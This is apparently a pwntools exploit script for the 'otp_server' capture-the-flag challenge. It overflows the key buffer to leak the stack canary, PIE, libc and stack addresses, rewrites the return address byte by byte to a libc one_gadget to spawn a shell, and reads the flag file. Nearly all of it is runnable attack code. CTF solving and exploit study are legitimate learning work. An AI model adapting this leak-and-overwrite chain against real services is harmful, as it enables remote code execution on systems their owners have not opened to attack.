from pwn import *

from time import time

context.bits = 64
#context.log_level = 'debug'
context.terminal = ['tmux', 'split-window', '-h']
context.buffer_size = 65536

p = None

def go(aslr=False):
  global p

  p = process("./otp_server")
  if (not aslr):
    gdb.attach(p, gdbscript='''
      break rop_protocol
      #break *0x400c28
      #break *0x400c04
      c 
    ''')
  else:
    gdb.attach(p)
  return


p = remote("challenges.fbctf.com", 1338) #Change host and port
#p = process("./otp_server")
#go(True)

def set_key(value):
  p.readuntil(">>> ")
  p.sendline("1")
  p.readuntil("Enter key:\n")
  p.sendline(value)


def encrypt_message(message):
  p.readuntil(">>> ")
  p.sendline("2")
  p.readuntil("Enter message to encrypt:\n")
  p.send('Q'*256)


def leak_stack():
  set_key("Q"*256)
  encrypt_message("A"*256)

  p.readuntil("----- BEGIN ROP ENCRYPTED MESSAGE -----\n")
  stack = p.readuntil("----- END ROP ENCRYPTED MESSAGE -----\n");

  canary = u64(stack[264:272])
  pie_leak = u64(stack[272:280])
  libc_leak = u64(stack[280:288])
  stack_leak= u64(stack[296:304])

  return stack, canary, libc_leak, pie_leak, stack_leak


def leak_offset_byte(offset):
  set_key("Q"*256)
  encrypt_message("A"*256)

  p.readuntil("----- BEGIN ROP ENCRYPTED MESSAGE -----\n")
  stack = p.readuntil("----- END ROP ENCRYPTED MESSAGE -----\n");

  byte = u8(stack[263 + offset])
  return byte


def write_offset(offset):
  set_key("B" * (offset) + "\x00")
  encrypt_message("A"*256)

  print("written byte: " + hex(leak_offset_byte(offset)))

  return leak_offset_byte(offset)

def write_until_byte_equals(offset, byte, count):
  current = None

  before = time()
  try_c = 0
  while current != byte:
    bb = time();
    set_key("B" * (offset) + "\x00")
    encrypt_message("A"*256)

    current = leak_offset_byte(offset)
    print(("attempt (%d):(%d): " % (count, try_c)) + str(time() - bb))
    try_c += 1

  print("FINAL: " + str(time() - before))

  return current


def dump_indexes(string):
  for i, c in enumerate(string):
    print("index {0}: {1}".format(i, hex(ord(c))))


def write_qword(addr, offset):
  for i in range(2, -1, -1):
    m = (addr & (0xff << (i * 8))) >> (i * 8)
    write_until_byte_equals(offset + i, m, 2 - i)


stack, canary, libc_leak, pie_leak, stack_leak = leak_stack()
libc_base = libc_leak - 0x21b97
elf_base = pie_leak - 0xdd0
one_gadget = libc_base + 0x4f322

write_qword(one_gadget, 17)

print("CANARY LEAK: " + hex(canary))
print("LIBC LEAK: " + hex(libc_leak))
print("One gadget: " + hex(one_gadget))
print("PIE LEAK: " + hex(pie_leak))
print("LIBC BASE: " + hex(libc_base))
print("ELF BASE: " + hex(elf_base))
print("STACK LEAK: " + hex(stack_leak))

_, _, return_addr, _, _ = leak_stack()

log.info("Return addr: " + hex(return_addr))

p.sendline("3")
p.sendline("cat /home/otp_server/flag")
p.sendline("exit")
print(p.recvall())
